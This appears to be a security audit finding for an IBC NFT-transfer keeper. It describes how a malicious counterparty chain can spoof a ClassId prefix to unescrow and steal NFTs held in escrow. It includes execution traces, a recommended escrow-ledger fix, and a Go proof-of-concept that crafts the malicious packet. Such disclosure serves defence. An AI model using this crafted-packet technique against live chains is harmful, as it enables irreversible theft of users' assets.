### Title
Malicious IBC Counterparty Can Drain Escrowed NFTs via Crafted ClassId in Received Packet — (`x/nft-transfer/keeper/packet.go`)

---

### Summary

`processReceivedPacket` determines whether to unescrow or mint based solely on whether `data.ClassId` is prefixed with the packet's source port/channel. A malicious counterparty chain can craft a packet whose `data.ClassId` is prefixed with its own source port/channel (e.g., `"nft/channel-1/victimClass"`), causing `IsAwayFromOrigin` to return `false`, which triggers the unescrow path. The escrow address is derived from the **destination** port/channel (chain A's side), which is exactly where legitimate NFTs are held. There is no check that the class was ever sent from chain A via this channel.

---

### Finding Description

**Precondition:** Alice on chain A sends native NFT `victimClass/token1` to chain B via `(sourcePort="nft", sourceChannel="channel-0")`. In `createOutgoingPacket`, `IsAwayFromOrigin("nft","channel-0","victimClass")` returns `true`, so the NFT is escrowed: [1](#0-0) 

The escrow address is `GetEscrowAddress("nft","channel-0")`.

**Attack:** Chain B (malicious) submits a packet to chain A with:
- `packet.SourcePort = "nft"`, `packet.SourceChannel = "channel-1"` (chain B's side)
- `packet.DestPort = "nft"`, `packet.DestChannel = "channel-0"` (chain A's side)
- `data.ClassId = "nft/channel-1/victimClass"` (attacker-controlled)
- `data.TokenIds = ["token1"]`, `data.Receiver = attackerAddress`

**Execution in `processReceivedPacket`:**

Step 1 — direction check: [2](#0-1) 

```
IsAwayFromOrigin("nft", "channel-1", "nft/channel-1/victimClass")
  → prefixClassID = "nft/channel-1/"
  → strings.HasPrefix("nft/channel-1/victimClass", "nft/channel-1/") = true
  → returns false   ← attacker forced this
``` [3](#0-2) 

Step 2 — escrow address computed from **dest** port/channel: [4](#0-3) 

`GetEscrowAddress("nft","channel-0")` — this is the **same address** that holds Alice's escrowed NFT.

Step 3 — else branch strips prefix and calls `TransferOwner`: [5](#0-4) 

```
unprefixedClassID = RemoveClassPrefix("nft","channel-1","nft/channel-1/victimClass") = "victimClass"
voucherClassID    = ParseClassTrace("victimClass").IBCClassID()                       = "victimClass"
TransferOwner(ctx, "victimClass", "token1", GetEscrowAddress("nft","channel-0"), attackerAddress)
``` [6](#0-5) [7](#0-6) 

Step 4 — `TransferOwner` in the NFT keeper only checks that `srcOwner` currently owns the token: [8](#0-7) 

Since `GetEscrowAddress("nft","channel-0")` does own `victimClass/token1`, the transfer succeeds and the attacker receives the NFT.

**Root cause:** There is no invariant enforced that a "returning-to-origin" packet must correspond to a class that was actually sent from this chain via this channel. The direction decision is made purely from the attacker-supplied `data.ClassId` string, with no cross-reference to any send-packet record or escrow ledger.

---

### Impact Explanation

Any NFT escrowed at `GetEscrowAddress(destPort, destChannel)` — regardless of which user originally sent it — can be stolen by the counterparty chain by crafting a packet with `data.ClassId = "<counterpartyPort>/<counterpartyChannel>/<nativeClassID>"`. The attacker receives full ownership of the NFT. This is a direct, irreversible theft of user assets.

---

### Likelihood Explanation

Requires control of a connected IBC counterparty chain (or a malicious relayer that can submit arbitrary packet data on behalf of a chain). This is a realistic threat model for IBC: any chain that has an open channel to chain A is a potential attacker. No governance, no key compromise, and no special privilege on chain A is needed — only the ability to submit a crafted IBC packet from the counterparty side.

---

### Recommendation

In the `else` (unescrow) branch of `processReceivedPacket`, verify that the unprefixed class ID and token ID were actually escrowed via this specific channel. The standard ICS-721 mitigation is to maintain a per-channel escrow ledger (mapping `(destPort, destChannel, classID, tokenID) → escrowed`) and require a matching entry before calling `TransferOwner`. Without this check, the direction logic is entirely attacker-controlled.

---

### Proof of Concept

```go
// 1. Alice escrows victimClass/token1 via legitimate send on channel-0
k.SendTransfer(ctx, "nft", "channel-0", "victimClass", []string{"token1"}, alice, bobOnChainB, ...)
// NFT is now owned by GetEscrowAddress("nft","channel-0")

// 2. Malicious chain B crafts inbound packet
craftedPacket := channeltypes.Packet{
    SourcePort:      "nft",
    SourceChannel:   "channel-1",   // chain B's channel
    DestinationPort: "nft",
    DestinationChannel: "channel-0", // chain A's channel
}
craftedData := types.NonFungibleTokenPacketData{
    ClassId:   "nft/channel-1/victimClass", // prefixed with B's source port/channel
    TokenIds:  []string{"token1"},
    TokenUris: []string{""},
    Sender:    bobOnChainB,
    Receiver:  attackerOnChainA,
}

// 3. Chain A processes it — IsAwayFromOrigin returns false, unescrow path taken
k.OnRecvPacket(ctx, version, craftedPacket, craftedData)

// 4. Assert: victimClass/token1 is now owned by attackerOnChainA, not escrow
owner := nftKeeper.GetNFT(ctx, "victimClass", "token1").GetOwner()
assert(owner == attackerOnChainA) // PASSES — exploit confirmed
```

func (k Keeper) TransferOwner(
	ctx sdk.Context, denomID, tokenID string, srcOwner, dstOwner sdk.AccAddress,
) error {
	if !k.HasDenomID(ctx, denomID) {
		return sdkerrors.Wrapf(types.ErrInvalidDenom, "denom ID %s not exists", denomID)
	}

	nft, err := k.IsOwner(ctx, denomID, tokenID, srcOwner)
	if err != nil {
		return err
	}

	nft.Owner = dstOwner.String()

	k.setNFT(ctx, denomID, nft)
	k.swapOwner(ctx, denomID, tokenID, srcOwner, dstOwner)
	return nil
}
